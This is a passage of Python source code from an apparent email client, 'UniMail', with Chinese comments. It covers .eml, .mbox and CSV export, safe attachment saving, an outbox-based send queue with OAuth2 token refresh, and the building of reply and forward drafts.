                    log.info("取原始报文失败，改用本地重建：%s", exc)
        return self._reconstruct_rfc822(mail)

    def _reconstruct_rfc822(self, mail: Mail) -> bytes:
        """用本地已存字段重建一封 RFC822 邮件（不联网，可测）。"""
        msg = email.message.EmailMessage()
        msg["Subject"] = mail.subject or ""
        if mail.from_addr or mail.from_name:
            msg["From"] = email.utils.formataddr((mail.from_name or "", mail.from_addr or ""))
        if mail.to_addrs:
            msg["To"] = ", ".join(mail.to_addrs)
        if mail.date:
            dt = mail.date if mail.date.tzinfo else mail.date.replace(tzinfo=timezone.utc)
            msg["Date"] = email.utils.format_datetime(dt)
        if mail.message_id:
            msg["Message-ID"] = mail.message_id
        msg["X-UniMail-Note"] = (
            "由 UniMail 从本地存储字段重建（未能取回服务器原始报文），"
            "原文头部顺序与签名信息可能缺失。"
        )
        body_text = mail.body_text or _strip_tags(mail.body_html)
        msg.set_content(body_text or "")
        if mail.body_html:
            msg.add_alternative(mail.body_html, subtype="html")
        for att in mail.attachments:
            if not att.stored_path:
                continue
            path = Path(att.stored_path)
            if not path.is_file():
                continue
            maintype, _, subtype = (att.content_type or "application/octet-stream").partition("/")
            try:
                msg.add_attachment(path.read_bytes(), maintype=maintype or "application",
                                   subtype=subtype or "octet-stream",
                                   filename=att.filename or path.name)
            except OSError:
                log.warning("重建邮件时读取附件失败：%s", path, exc_info=True)
        return msg.as_bytes()

    def export_eml(self, mail_id: str, target: str | Path) -> Path:
        """导出单封邮件为 `.eml`。"""
        data = self.build_rfc822(mail_id)
        dest = Path(target)
        dest.parent.mkdir(parents=True, exist_ok=True)
        dest.write_bytes(data)
        log.info("已导出邮件：%s（%d 字节）", dest, len(data))
        return dest

    def export_mbox(self, mail_ids: list[str], target: str | Path,
                    *, progress: object = None) -> tuple[Path, int]:
        """把多封邮件导出为 `.mbox` 归档。

        格式要点：每封前加一行 `From <发件人> <日期>`，正文里以 `From `
        开头的行要转义成 `>From `——否则 mbox 解析器会把正文误当成新邮件的开始。
        这是 mboxo 的规范做法，Thunderbird / mutt 都按它解析。
        """
        dest = Path(target)
        dest.parent.mkdir(parents=True, exist_ok=True)
        written = 0
        with open(dest, "wb") as fh:
            for i, mail_id in enumerate(mail_ids, 1):
                mail = self.mails.get(mail_id)
                if mail is None:
                    continue
                try:
                    raw = self.build_rfc822(mail_id)
                except (OSError, ValueError, ImapError) as exc:
                    log.warning("导出 %s 失败：%s", mail_id[:8], exc)
                    continue
                sender = mail.from_addr or "unknown@unimail"
                when = (mail.date or datetime.now(timezone.utc)).strftime("%a %b %d %H:%M:%S %Y")
                fh.write(f"From {sender} {when}\n".encode("utf-8", errors="replace"))
                escaped = b"\n".join(
                    b">" + line if line.startswith(b"From ") else line
                    for line in raw.replace(b"\r\n", b"\n").split(b"\n")
                )
                fh.write(escaped)
                if not escaped.endswith(b"\n"):
                    fh.write(b"\n")
                fh.write(b"\n")
                written += 1
                if callable(progress):
                    progress(i, len(mail_ids))
        log.info("已导出 mbox：%s（%d 封）", dest, written)
        return dest, written

    def export_csv(self, flt: MailFilter, target: str | Path) -> tuple[Path, int]:
        """把当前筛选结果导出为 CSV（复用列表投影，不加载正文）。"""
        rows = self.mails.query_summaries(flt)
        dest = Path(target)
        dest.parent.mkdir(parents=True, exist_ok=True)
        # utf-8-sig：Excel 打开中文 CSV 时不会乱码（BOM 是其识别依据）
        with open(dest, "w", encoding="utf-8-sig", newline="") as fh:
            writer = csv.writer(fh)
            writer.writerow(["时间", "发件人", "发件人地址", "主题", "平台",
                             "账号", "已读", "星标", "附件", "大小(字节)", "摘要"])
            for m in rows:
                writer.writerow([
                    m.date.astimezone().strftime("%Y-%m-%d %H:%M") if m.date else "",
                    csv_guard(m.from_name), csv_guard(m.from_addr),
                    csv_guard(m.subject), csv_guard(m.platform),
                    csv_guard(m.account_id),
                    "是" if m.is_read else "否", "是" if m.is_starred else "否",
                    "是" if m.has_attachments else "否", m.raw_size,
                    csv_guard((m.preview or "").replace("\n", " ")),
                ])
        log.info("已导出 CSV：%s（%d 行）", dest, len(rows))
        return dest, len(rows)

    @staticmethod
    def _dangerous_extension(filename: str | None) -> bool:
        if not filename or "." not in filename:
            return False
        ext = filename.rsplit(".", 1)[-1].strip().lower()
        return ext in DANGEROUS_EXTENSIONS

    @staticmethod
    def _danger_hint(filename: str | None, renamed: bool = True) -> str:
        ext = (filename or "").rsplit(".", 1)[-1] if filename and "." in filename else ""
        head = (
            f"该附件是 {ext.upper()} 类型，可能包含可执行代码。\n"
        )
        if renamed:
            return head + (
                "为避免误双击直接运行，已保存为 .download 后缀；"
                "确实需要打开时请自行重新命名，并确认来源可靠。"
            )
        return head + (
            "该文件此前已下载到本地（保留原后缀）。"
            "打开前请确认来源可靠，并留意杀毒软件告警。"
        )

    @staticmethod
    def _check_size_limit(size: int | None, filename: str | None) -> None:
        if not MAX_ATTACHMENT_BYTES or not size:
            return
        if size > MAX_ATTACHMENT_BYTES:
            limit_mb = MAX_ATTACHMENT_BYTES / (1024 * 1024)
            raise ValueError(
                f"附件 {filename or ''} 约 {size / (1024 * 1024):.1f} MB，"
                f"超过单文件上限 {limit_mb:.0f} MB。\n"
                "如需调整，请修改 config.MAX_ATTACHMENT_BYTES。"
            )

    @staticmethod
    def _atomic_write_exclusive(target: Path, data: bytes) -> Path:
        """独占创建 + 先写 .part 再原子改名。"""
        ATTACHMENT_DIR.mkdir(parents=True, exist_ok=True)
        final = target
        for i in range(1, 100):
            try:
                fd = os.open(str(final), os.O_CREAT | os.O_EXCL | os.O_WRONLY, 0o600)
                os.close(fd)
                break
            except FileExistsError:
                final = target.with_name(f"{target.stem}({i}){target.suffix}")
        else:
            raise OSError(f"附件目录中同名文件过多：{target.name}")

        part = final.with_name(final.name + ".part")
        try:
            with open(part, "wb") as fh:
                fh.write(data)
                fh.flush()
                os.fsync(fh.fileno())
            os.replace(part, final)
        except BaseException:
            unlink_attachment_file(part)
            unlink_attachment_file(final)       # 占位文件不留残骸
            raise
        return final

    @staticmethod
    def _decode_attachment_payload(raw: bytes, content_type: str) -> bytes:
        """IMAP BODY[part] 返回的是**已解码**内容，但部分服务器会返回带
        Content-Transfer-Encoding 头的原文。这里做兼容处理。"""
        # 多数情况：服务器已按 CTE 解码，直接用
        if not raw.startswith(b"Content-"):
            return raw
        # 少数情况：返回了完整的 MIME 片段，交给 email 库解析
        try:
            import email as _email
            msg = _email.message_from_bytes(raw)
            payload = msg.get_payload(decode=True)
            if isinstance(payload, bytes) and payload:
                return payload
        except Exception:  # noqa: BLE001
            log.warning("附件 MIME 解码失败，回退为原始字节")
        return raw


def humanize_time(dt: datetime | None) -> str:
    """把时间格式化成列表里友好的显示形式。"""
    if dt is None:
        return ""
    now = datetime.now(timezone.utc)
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=timezone.utc)
    delta = now - dt
    seconds = delta.total_seconds()
    if seconds < 60:
        return "刚刚"
    if seconds < 3600:
        return f"{int(seconds // 60)} 分钟前"
    local = dt.astimezone()
    if local.date() == now.astimezone().date():
        return local.strftime("%H:%M")
    if local.year == now.astimezone().year:
        return local.strftime("%m-%d %H:%M")
    return local.strftime("%Y-%m-%d")


@dataclass
class ComposeDraft:
    """撰写界面的输入载体（含明文正文与附件字节，仅存活于内存）。

    与 `AccountDraft` 同一性质：这是「用户正在写、还没发」的状态，
    落库前一律经过加密库；`attachments` 里的字节在 `queue()` 时被编码进
    RFC 5322 原文，之后即从内存丢弃（需要原文时从 outbox 的 `raw` 列取）。
    """
    account_id: str
    to: list[str] = field(default_factory=list)
    cc: list[str] = field(default_factory=list)
    subject: str = ""
    body: str = ""
    in_reply_to: str = ""
    ref_chain: list[str] = field(default_factory=list)
    # [(文件名, 字节, MIME 类型)]
    attachments: list[tuple[str, bytes, str]] = field(default_factory=list)

    @property
    def to_display(self) -> str:
        return ", ".join(self.to)


@dataclass
class SendResult:
    ok: bool
    message_id: str = ""        # outbox 行 id
    error: str = ""
    queued: bool = False        # True = 只入队未发送（离线模式）


class ComposeService:
    """发信用例：构造邮件 → 入队 → 发送 → 状态回写。

    为什么先入队再发送
    ----------------
    直接「点发送 → SMTP 同步调用」看起来更简单，但有两个真问题：
    1. **失败即丢失**。SMTP 失败（网络抖动、认证过期、服务器 5xx）时邮件
       只在内存里，用户点过发送就只能重写——包括重选附件。
    2. **无法跨重启**。应用在发送途中崩溃（或用户手动杀进程），那封邮件
       连记录都不存在。

    因此顺序固定为：`queue()` 落库（含完整原文）→ `send_one()` 发送 →
    状态回写。`queue()` 与 `send_one()` 分开，也顺带给出了「离线排队、
    稍后统一发送」的形态——发送失败时邮件留在 outbox 里，用户随时可重试。

    为什么不自动重发
    ----------------
    邮件不能盲目重试：SMTP 的 `DATA` 阶段服务器可能已经收下、只是响应
    丢了，此时重发会让对方收到两封完全相同的邮件。因此失败态由**用户**
    决定是否重试（`retry()`），attempts 计数只是让界面能显示「已试过 N 次」。
    """

    def __init__(self, accounts: AccountRepository, outbox: OutboxRepository,
                 security, bus: EventBus | None = None,
                 mails: MailRepository | None = None) -> None:
        self.accounts = accounts
        self.outbox = outbox
        self.security = security
        self.bus = bus
        # 邮件仓储仅「回复/转发」需要（读原邮件的线程头），新邮件不需要。
        # 做成可选参数而不是必填：调用方只发新邮件时不必关心它。
        self.mails = mails
        # access_token 内存缓存（与 AccountService 各持一份，避免为了发一封邮件
        # 把整个 AccountService 拖进来）。同样不落盘。
        self._tokens: dict[str, TokenSet] = {}

    # ------------------------------------------------------------ 凭据
    def _account_and_secret(self, account_id: str) -> tuple[Account, str]:
        """取账号与**可用密码/token**。

        OAuth2 账号在此换成短期 access_token：SMTP 的 XOAUTH2 要的是
        access_token，而库里存的是 refresh_token。不换的话发送必然失败，
        而用户看到的是「认证被拒」——他会去改密码，那条路对 OAuth2 账号
        根本不存在。
        """
        account = self.accounts.get(account_id)
        if account is None:
            raise ValueError("账号不存在或已被删除")
        ciphertext = self.accounts.get_credential(account.id)
        if ciphertext is None:
            raise ValueError("无法获取该账号凭据，请重新添加账号")
        secret = self.security.decrypt_secret(ciphertext)
        if str(getattr(account, "auth_type", "")).startswith("oauth2"):
            secret = self._access_token(account, secret)
        return account, secret

    def _access_token(self, account: Account, refresh_token: str) -> str:
        cached = self._tokens.get(account.id)
        if cached is not None and not cached.expired():
            return cached.access_token
        try:
            tokens = refresh_access_token(provider_for(account.platform), refresh_token)
        except OAuthError as exc:
            raise ValueError(
                f"OAuth2 授权已失效，无法发送：{exc}\n请在账号管理中重新授权。"
            ) from exc
        self._tokens[account.id] = tokens
        return tokens.access_token

    # ------------------------------------------------------------ 队列
    def queue(self, draft: ComposeDraft) -> str:
        """把一封邮件写入 outbox（完整原文），返回 outbox id。"""
        account, secret = self._account_and_secret(draft.account_id)
        if not draft.to:
            raise ValueError("请填写收件人")
        if not draft.subject.strip() and not draft.body.strip():
            raise ValueError("主题与正文不能都为空")

        msg = build_message(
            from_addr=account.email,
            from_name=account.display_name or "",
            to=draft.to,
            subject=draft.subject,
            body_text=draft.body,
            cc=draft.cc or None,
            in_reply_to=draft.in_reply_to,
            references=draft.ref_chain or None,
            attachments=draft.attachments or None,
        )
        # `as_bytes()` 而非 `as_string()`：后者按 policy 重新编码，
        # 含非 ASCII 附件名时可能改变字节序；原文要原样重放，必须是确定性字节。
        raw = msg.as_bytes().decode("utf-8", errors="replace")
        msg_id = self.outbox.add(
            draft.account_id, draft.subject, draft.to_display, raw,
            in_reply_to=draft.in_reply_to, ref_chain=" ".join(draft.ref_chain),
        )
        log.info("邮件已入队：%s → %s", account.email, draft.to_display)
        return msg_id

    # ------------------------------------------------------------ 发送
    def send_one(self, outbox_id: str) -> SendResult:
        """发送队列里的一封。失败时保留原文与错误，供用户重试。"""
        item = self.outbox.get(outbox_id)
        if item is None:
            return SendResult(ok=False, error="找不到该封待发邮件")
        if item.status == OUTBOX_SENT:
            return SendResult(ok=True, message_id=outbox_id)

        try:
            account, secret = self._account_and_secret(item.account_id)
        except ValueError as exc:
            self.outbox.mark_failed(outbox_id, str(exc))
            return SendResult(ok=False, message_id=outbox_id, error=str(exc))

        self.outbox.mark_sending(outbox_id)
        cfg = SmtpConfig.from_account(account, secret)
        # outbox 里存的是完整 RFC 5322 原文，**原样**交给 SMTP：
        # 中途解析再重组会引入「附件丢失 / 头顺序变化 / 编码被改」的风险，
        # 而原样重放保证「发出去的与用户看到的队列内容完全一致」。
        message = email.message_from_string(item.raw)
        try:
            smtp_send(cfg, message)
        except (SmtpError, OAuthError) as exc:
            self.outbox.mark_failed(outbox_id, str(exc))
            log.warning("发送失败（%s）：%s", outbox_id, exc)
            return SendResult(ok=False, message_id=outbox_id, error=str(exc))
        self.outbox.mark_sent(outbox_id)
        log.info("邮件已发送：%s", item.subject)
        return SendResult(ok=True, message_id=outbox_id)

    def send_all_pending(self, account_id: str | None = None) -> list[SendResult]:
        """把队列里全部待发邮件依次发出（串行：SMTP 是短连接，并发无收益，
        且多数服务商对同一账号的并发登录有限制）。"""
        results = []
        for item in self.outbox.pending(account_id):
            results.append(self.send_one(item.id))
        return results

    def retry(self, outbox_id: str) -> SendResult:
        """用户主动重试：清掉错误态后重新发送。"""
        item = self.outbox.get(outbox_id)
        if item is None:
            return SendResult(ok=False, error="找不到该封邮件")
        self.outbox.reset_to_pending(outbox_id)
        return self.send_one(outbox_id)

    # ------------------------------------------------------------ 查询
    def list(self, account_id: str | None = None, limit: int = 100) -> list[OutboxMessage]:
        return self.outbox.list(account_id, limit)

    def pending_count(self, account_id: str | None = None) -> int:
        return len(self.outbox.pending(account_id))

    def counts(self, account_id: str | None = None) -> dict[str, int]:
        return self.outbox.counts(account_id)

    def delete(self, outbox_id: str) -> None:
        self.outbox.delete(outbox_id)

    # ------------------------------------------------------------ 回复/转发
    def build_reply(self, mail_id: str, *, reply_all: bool = False,
                    account_id: str = "") -> ComposeDraft:
        """按一封已收邮件构造回复草稿（不含引用原文，正文由界面预填）。

        **线程头必须从原邮件取**：`In-Reply-To` 填原邮件的 Message-ID，
        `References` 是「原邮件的 References + 其 Message-ID」。这两项填错，
        对方客户端（以及 UniMail 自己的会话视图）会把回复显示成独立新邮件，
        会话就此断链——这是「回复」功能最核心的正确性要求，比正文格式重要得多。

        引用原文刻意**不**在此处拼进 body：顶部引用 vs 底部引用、
        是否带「在 … 写道：」前缀，是见仁见智的界面选择，属于 UI 层的决策。
        """
        from .models import load_str_list

        mail = self.mails_get(mail_id)
        if mail is None:
            raise ValueError("找不到该邮件")
        draft = ComposeDraft(account_id=account_id or mail.account_id)
        draft.subject = self._reply_subject(mail.subject or "")
        draft.in_reply_to = mail.message_id or ""
        chain = list(mail.references)
        if mail.message_id and mail.message_id not in chain:
            chain.append(mail.message_id)
        draft.ref_chain = chain
        draft.to = self._reply_recipients(mail, reply_all=reply_all)
        if reply_all and mail.to_addrs:
            draft.cc = self._cc_recipients(mail)
        return draft

    def build_forward(self, mail_id: str, *, account_id: str = "") -> ComposeDraft:
        """构造转发草稿（不带线程头——转发不是线程的一部分）。"""
        mail = self.mails_get(mail_id)
        if mail is None:
            raise ValueError("找不到该邮件")
        draft = ComposeDraft(account_id=account_id or mail.account_id)
        draft.subject = self._forward_subject(mail.subject or "")
        # 转发保留原邮件的基本信息，正文由界面拼装（含附件提示）。
        header = [
            "",
            "---------- 转发的邮件 ----------",
            f"发件人：{mail.from_name} <{mail.from_addr}>",
            f"日期：{mail.date.isoformat() if mail.date else ''}",
            f"主题：{mail.subject or ''}",
            "",
        ]
        draft.body = "\n".join(header) + (mail.body_text or "")
        return draft

    def mails_get(self, mail_id: str):
        """经 MailRepository 取一封邮件。

        `self.mails` 为 None 时给出可读错误而不是 AttributeError：
        构造时没传邮件仓储（只发新邮件的用法）却调了回复/转发，
        那是调用方的接线疏漏，错误信息要说明缺什么。
        """
        if self.mails is None:
            raise ValueError("邮件仓储未配置，无法读取原邮件（回复/转发不可用）")
        return self.mails.get(mail_id)

    @staticmethod
    def _reply_subject(subject: str) -> str:
        s = subject.strip()
        if s.lower().startswith("re:"):
            return s
        return f"Re: {s}" if s else "Re:"

    @staticmethod
    def _forward_subject(subject: str) -> str:
        s = subject.strip()
        if s.lower().startswith("fwd:"):
            return s
        return f"Fwd: {s}" if s else "Fwd:"

    @staticmethod
    def _reply_recipients(mail, *, reply_all: bool) -> list[str]:
        """回复的收件人：默认只回发件人；reply_all 时加上原 To 里的其他人。"""
        to: list[str] = []
        if mail.from_addr:
            to.append(mail.from_addr)
        if reply_all:
            for addr in (mail.to_addrs or []):
                if addr and addr not in to:
                    to.append(addr)
        return to

    @staticmethod
    def _cc_recipients(mail) -> list[str]:
        """reply_all 的 CC：原邮件的 To 里除发件人与主收件人之外的人。

        刻意**不**把原 CC 的人带进回复的 CC：原邮件的 CC 往往是上一线程的
        旁观者，继续抄送会把讨论扩散给不相关的人。
        """
        cc: list[str] = []
        for addr in (mail.to_addrs or []):
            if addr and addr != mail.from_addr and addr not in cc:
                cc.append(addr)
        return cc
